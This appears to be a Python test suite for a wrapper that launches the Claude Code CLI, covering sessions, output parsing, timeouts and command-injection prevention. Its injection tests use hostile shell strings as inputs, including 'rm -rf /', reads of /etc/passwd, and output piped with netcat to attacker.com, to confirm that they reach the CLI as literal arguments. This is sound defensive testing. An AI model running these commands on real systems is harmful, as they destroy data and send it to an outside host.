"""Tests for agent/claude_code_runner.py — session management and run_claude_prompt."""

import asyncio
import json
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from agent.claude_code_runner import (
    ChatSession,
    ChatResult,
    _find_claude_binary,
    end_session,
    get_active_session,
    run_claude_chat,
    run_claude_code,
    run_claude_prompt,
    run_claude_prompt_async,
    _active_sessions,
)


def _make_async_proc(returncode=0, stdout=b"", stderr=b""):
    """Build a fake asyncio subprocess with communicate() returning stdout/stderr."""
    proc = MagicMock()
    proc.returncode = returncode
    proc.communicate = AsyncMock(return_value=(stdout, stderr))
    proc.kill = MagicMock()
    return proc


class TestSessionManagement:
    """In-memory dict operations — no mocks needed."""

    def setup_method(self):
        _active_sessions.clear()

    def test_no_active_session(self):
        assert get_active_session(12345) is None

    def test_get_active_session(self):
        session = ChatSession(session_id="abc", user="test", channel_id=12345)
        _active_sessions[12345] = session
        assert get_active_session(12345) is session

    def test_end_session(self):
        session = ChatSession(session_id="abc", user="test", channel_id=12345)
        _active_sessions[12345] = session
        ended = end_session(12345)
        assert ended is session
        assert get_active_session(12345) is None

    def test_end_nonexistent_session(self):
        assert end_session(99999) is None


class TestChatSession:
    def test_dataclass_fields(self):
        s = ChatSession(session_id="abc", user="test", channel_id=1)
        assert s.session_id == "abc"
        assert s.user == "test"
        assert s.channel_id == 1
        assert s.turn_count == 0
        assert s.total_cost_usd == 0.0


class TestRunClaudePrompt:
    """Mock subprocess to test the shared utility."""

    def test_binary_not_found(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            result = run_claude_prompt("test")
            assert result["success"] is False
            assert "not found" in result["error"]

    def test_successful_json_response(self):
        import json

        fake_output = json.dumps({
            "result": "Hello world!",
            "session_id": "sess-123",
            "total_cost_usd": 0.01,
        })
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = fake_output
        mock_result.stderr = ""

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", return_value=mock_result):
                result = run_claude_prompt("Say hello")
                assert result["success"] is True
                assert result["result"] == "Hello world!"
                assert result["cost_usd"] == 0.01
                assert result["session_id"] == "sess-123"

    def test_nonzero_exit_code(self):
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "Some error"

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", return_value=mock_result):
                result = run_claude_prompt("test")
                assert result["success"] is False
                assert "Some error" in result["error"]

    def test_timeout(self):
        import subprocess

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch(
                "agent.claude_code_runner.subprocess.run",
                side_effect=subprocess.TimeoutExpired(cmd="claude", timeout=30),
            ):
                result = run_claude_prompt("test", timeout=30)
                assert result["success"] is False
                assert "Timed out" in result["error"]

    def test_malformed_json_fallback(self):
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "Not valid JSON but still output"
        mock_result.stderr = ""

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", return_value=mock_result):
                result = run_claude_prompt("test")
                assert result["success"] is True
                assert result["result"] == "Not valid JSON but still output"

    def test_strips_api_key_from_env(self):
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = '{"result": "ok"}'
        mock_result.stderr = ""

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", return_value=mock_result) as mock_run:
                with patch.dict("os.environ", {"ANTHROPIC_API_KEY": "secret123", "CLAUDECODE": "1"}):
                    run_claude_prompt("test")
                    call_env = mock_run.call_args.kwargs.get("env", {})
                    assert "ANTHROPIC_API_KEY" not in call_env
                    assert "CLAUDECODE" not in call_env


class TestFindClaudeBinary:
    def test_returns_none_when_no_extensions(self):
        with patch("pathlib.Path.exists", return_value=False):
            result = _find_claude_binary()
            # Either None or a valid path (if actually installed)
            assert result is None or result.exists()


class TestChatResult:
    def test_dataclass_fields(self):
        r = ChatResult(
            success=True, response="hello", session_id="abc",
            duration=1.5, cost_usd=0.01, is_new_session=True,
        )
        assert r.success is True
        assert r.response == "hello"
        assert r.session_id == "abc"
        assert r.cost_usd == 0.01

    def test_failed_result(self):
        r = ChatResult(
            success=False, response="Error: timeout",
            session_id="", duration=30.0, cost_usd=0, is_new_session=False,
        )
        assert r.success is False
        assert "Error" in r.response


class TestRunClaudePromptEdgeCases:
    def test_empty_stdout(self):
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", return_value=mock_result):
                result = run_claude_prompt("test")
                assert result["success"] is True
                assert result["result"] == ""

    def test_general_exception(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", side_effect=OSError("Permission denied")):
                result = run_claude_prompt("test")
                assert result["success"] is False
                assert "Permission denied" in result["error"]

    def test_result_dict_always_has_all_keys(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            result = run_claude_prompt("test")
            assert "success" in result
            assert "result" in result
            assert "cost_usd" in result
            assert "session_id" in result
            assert "duration" in result
            assert "error" in result


# =============================================================================
# run_claude_code (async, one-shot)
# =============================================================================


class TestRunClaudeCode:
    @pytest.mark.asyncio
    async def test_binary_not_found(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            success, output, duration = await run_claude_code("hi")
            assert success is False
            assert "not found" in output
            assert duration == 0.0

    @pytest.mark.asyncio
    async def test_success_returns_stdout(self):
        proc = _make_async_proc(returncode=0, stdout=b"  all good  ")
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch(
                "asyncio.create_subprocess_exec", AsyncMock(return_value=proc)
            ):
                success, output, duration = await run_claude_code("do something")
        assert success is True
        assert output == "all good"
        assert duration >= 0

    @pytest.mark.asyncio
    async def test_nonzero_exit_code_reports_stderr(self):
        proc = _make_async_proc(
            returncode=2, stdout=b"partial", stderr=b"boom"
        )
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                success, output, _ = await run_claude_code("task")
        assert success is False
        assert "boom" in output
        assert "exited with code 2" in output

    @pytest.mark.asyncio
    async def test_timeout(self):
        """wait_for raises TimeoutError → returns False with timeout message."""
        proc = _make_async_proc()
        # Force communicate to hang long enough that wait_for triggers the TimeoutError branch
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                with patch(
                    "asyncio.wait_for", AsyncMock(side_effect=asyncio.TimeoutError())
                ):
                    success, output, _ = await run_claude_code("task")
        assert success is False
        assert "timed out" in output.lower()
        proc.kill.assert_called()

    @pytest.mark.asyncio
    async def test_general_exception(self):
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=OSError("denied")),
            ):
                success, output, _ = await run_claude_code("task")
        assert success is False
        assert "denied" in output

    @pytest.mark.asyncio
    async def test_image_paths_injected_into_prompt(self):
        """When image_paths is passed, prompt gets image instructions appended."""
        proc = _make_async_proc(returncode=0, stdout=b"analyzed")
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_code("look at this", image_paths=["/img/a.png"])

        # The prompt arg follows "-p" in the call
        args = captured["args"]
        prompt_idx = list(args).index("-p") + 1
        assert "/img/a.png" in args[prompt_idx]
        assert "look at this" in args[prompt_idx]


# =============================================================================
# run_claude_chat (async, multi-turn)
# =============================================================================


class TestRunClaudeChat:
    @pytest.mark.asyncio
    async def test_binary_not_found(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            result = await run_claude_chat("hi")
        assert isinstance(result, ChatResult)
        assert result.success is False
        assert "not found" in result.response

    @pytest.mark.asyncio
    async def test_new_session_parses_json(self):
        payload = json.dumps({
            "result": "Hello!",
            "session_id": "sess-9",
            "total_cost_usd": 0.05,
        }).encode("utf-8")
        proc = _make_async_proc(returncode=0, stdout=payload)
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_chat("hi")
        assert result.success is True
        assert result.response == "Hello!"
        assert result.session_id == "sess-9"
        assert result.cost_usd == 0.05
        assert result.is_new_session is True

    @pytest.mark.asyncio
    async def test_resume_session_passes_resume_flag(self):
        payload = json.dumps({"result": "continued", "session_id": "sess-9"}).encode("utf-8")
        proc = _make_async_proc(returncode=0, stdout=payload)
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                result = await run_claude_chat("next turn", session_id="sess-9")
        assert result.is_new_session is False
        assert "--resume" in captured["args"]

    @pytest.mark.asyncio
    async def test_malformed_json_falls_back_to_raw(self):
        proc = _make_async_proc(returncode=0, stdout=b"not json at all")
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_chat("hi")
        assert result.success is True
        assert result.response == "not json at all"
        assert result.cost_usd == 0

    @pytest.mark.asyncio
    async def test_nonzero_returncode_returns_error(self):
        proc = _make_async_proc(
            returncode=1, stdout=b'{"result": "oops", "session_id": "s"}',
            stderr=b"stderr boom",
        )
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_chat("hi")
        assert result.success is False
        assert "boom" in result.response

    @pytest.mark.asyncio
    async def test_timeout_kills_proc(self):
        proc = _make_async_proc()
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                with patch(
                    "asyncio.wait_for", AsyncMock(side_effect=asyncio.TimeoutError())
                ):
                    result = await run_claude_chat("hi", session_id="s")
        assert result.success is False
        assert "imed out" in result.response
        assert result.session_id == "s"
        proc.kill.assert_called()

    @pytest.mark.asyncio
    async def test_general_exception(self):
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=RuntimeError("spawn failed")),
            ):
                result = await run_claude_chat("hi")
        assert result.success is False
        assert "spawn failed" in result.response

    @pytest.mark.asyncio
    async def test_image_paths_injected(self):
        proc = _make_async_proc(returncode=0, stdout=b'{"result": "ok"}')
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_chat("inspect", image_paths=["/x/img.png"])

        prompt_idx = list(captured["args"]).index("-p") + 1
        assert "/x/img.png" in captured["args"][prompt_idx]


# =============================================================================
# run_claude_prompt_async
# =============================================================================


class TestRunClaudePromptAsync:
    @pytest.mark.asyncio
    async def test_binary_not_found(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            result = await run_claude_prompt_async("hi")
        assert result["success"] is False
        assert result["error"] == "Claude Code binary not found"

    @pytest.mark.asyncio
    async def test_success_with_json(self):
        payload = json.dumps({
            "result": "hi there", "session_id": "s-1", "total_cost_usd": 0.02,
        }).encode("utf-8")
        proc = _make_async_proc(returncode=0, stdout=payload)
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_prompt_async("hi")
        assert result["success"] is True
        assert result["result"] == "hi there"
        assert result["session_id"] == "s-1"
        assert result["cost_usd"] == 0.02

    @pytest.mark.asyncio
    async def test_malformed_json_fallback(self):
        proc = _make_async_proc(returncode=0, stdout=b"raw output")
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_prompt_async("hi")
        assert result["success"] is True
        assert result["result"] == "raw output"
        assert result["cost_usd"] == 0

    @pytest.mark.asyncio
    async def test_nonzero_exit(self):
        proc = _make_async_proc(returncode=1, stdout=b"", stderr=b"fail")
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_prompt_async("hi")
        assert result["success"] is False
        assert result["error"] == "fail"

    @pytest.mark.asyncio
    async def test_timeout(self):
        proc = _make_async_proc()
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                with patch(
                    "asyncio.wait_for", AsyncMock(side_effect=asyncio.TimeoutError())
                ):
                    result = await run_claude_prompt_async("hi", timeout=5)
        assert result["success"] is False
        assert "imed out" in result["error"]
        proc.kill.assert_called()

    @pytest.mark.asyncio
    async def test_generic_exception(self):
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=RuntimeError("boom")),
            ):
                result = await run_claude_prompt_async("hi")
        assert result["success"] is False
        assert "boom" in result["error"]


class TestFindClaudeBinaryGlob:
    """Exercise the glob branch of _find_claude_binary."""

    def test_returns_first_candidate_when_glob_hits(self, tmp_path, monkeypatch):
        # Build a fake VS Code extensions directory
        ext_dir = tmp_path / ".vscode" / "extensions"
        bin_path = (
            ext_dir
            / "anthropic.claude-code-0.1.0"
            / "resources"
            / "native-binary"
            / "claude.exe"
        )
        bin_path.parent.mkdir(parents=True)
        bin_path.write_bytes(b"\x00")
        monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
        result = _find_claude_binary()
        assert result == bin_path

    def test_returns_none_when_no_candidates(self, tmp_path, monkeypatch):
        # extensions dir exists but contains nothing matching
        ext_dir = tmp_path / ".vscode" / "extensions"
        ext_dir.mkdir(parents=True)
        monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
        assert _find_claude_binary() is None

    def test_prefers_highest_version_extension(self, tmp_path, monkeypatch):
        """Multiple installed versions → the sorted-descending pick wins."""
        ext_dir = tmp_path / ".vscode" / "extensions"
        for ver in ("0.1.0", "0.2.5", "0.1.9"):
            p = (
                ext_dir
                / f"anthropic.claude-code-{ver}"
                / "resources"
                / "native-binary"
                / "claude.exe"
            )
            p.parent.mkdir(parents=True)
            p.write_bytes(b"\x00")
        monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
        result = _find_claude_binary()
        assert result is not None
        assert "0.2.5" in str(result)


# =============================================================================
# Command injection prevention — TK-393 security requirement
#
# All four entrypoints (run_claude_code, run_claude_chat, run_claude_prompt,
# run_claude_prompt_async) spawn the Claude binary via arg-list subprocess
# calls, never `shell=True`. These tests lock in that property: shell
# metacharacters in user-controlled fields must flow through as literal
# argv tokens, not be interpreted by a shell.
# =============================================================================


SHELL_METACHARACTERS = [
    "; rm -rf /",
    "`whoami`",
    "$(id)",
    "&& cat /etc/passwd",
    "| nc attacker.com 4444",
    "'; DROP TABLE users; --",
    "prompt\nmalicious second line",
]


class TestCommandInjectionPrevention:
    """Verify user input never reaches a shell — only argv tokens to Claude CLI."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
    async def test_run_claude_code_passes_prompt_as_single_arg(self, evil):
        """Malicious prompt content sits in argv[i+1] after '-p' as one literal token."""
        proc = _make_async_proc(returncode=0, stdout=b"safe")
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            captured["kwargs"] = kwargs
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_code(evil)

        args = list(captured["args"])
        # No shell=True kwarg — asyncio.create_subprocess_exec doesn't accept it anyway,
        # but verify we used the exec (argv) variant
        assert "shell" not in captured["kwargs"]
        prompt_idx = args.index("-p") + 1
        # The entire malicious string arrives as one token, unsplit
        assert args[prompt_idx] == evil

    @pytest.mark.asyncio
    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
    async def test_run_claude_chat_passes_prompt_as_single_arg(self, evil):
        proc = _make_async_proc(returncode=0, stdout=b'{"result": "safe"}')
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_chat(evil)

        args = list(captured["args"])
        prompt_idx = args.index("-p") + 1
        assert args[prompt_idx] == evil

    @pytest.mark.asyncio
    async def test_run_claude_chat_session_id_passes_as_arg(self):
        """A malicious session_id must reach argv as a literal token after --resume."""
        evil_session = "abc; rm -rf /"
        proc = _make_async_proc(returncode=0, stdout=b'{"result": "ok"}')
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_chat("hi", session_id=evil_session)

        args = list(captured["args"])
        resume_idx = args.index("--resume") + 1
        assert args[resume_idx] == evil_session

    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
    def test_run_claude_prompt_uses_arg_list_not_shell(self, evil):
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = '{"result": "ok"}'
        mock_result.stderr = ""

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch(
                "agent.claude_code_runner.subprocess.run", return_value=mock_result
            ) as mock_run:
                run_claude_prompt(evil)

        call = mock_run.call_args
        # First positional arg is the argv list (never a string, never shell=True)
        argv = call.args[0]
        assert isinstance(argv, list)
        assert call.kwargs.get("shell", False) is False
        prompt_idx = argv.index("-p") + 1
        assert argv[prompt_idx] == evil

    @pytest.mark.asyncio
    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
    async def test_run_claude_prompt_async_uses_arg_list(self, evil):
        proc = _make_async_proc(returncode=0, stdout=b'{"result": "ok"}')
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            captured["kwargs"] = kwargs
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_prompt_async(evil)

        args = list(captured["args"])
        assert "shell" not in captured["kwargs"]
        prompt_idx = args.index("-p") + 1
        assert args[prompt_idx] == evil

    @pytest.mark.asyncio
    async def test_image_paths_with_metacharacters_stay_in_prompt_arg(self):
        """Paths with shell metacharacters are embedded in the prompt, not passed as flags."""
        evil_path = "/tmp/img; rm -rf /.png"
        proc = _make_async_proc(returncode=0, stdout=b"ok")
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_code("analyze", image_paths=[evil_path])

        args = list(captured["args"])
        prompt_idx = args.index("-p") + 1
        # The evil path is inside the single prompt argv token
        assert evil_path in args[prompt_idx]
        # And no stray argv token matches it as a standalone arg
        assert args.count(evil_path) == 0
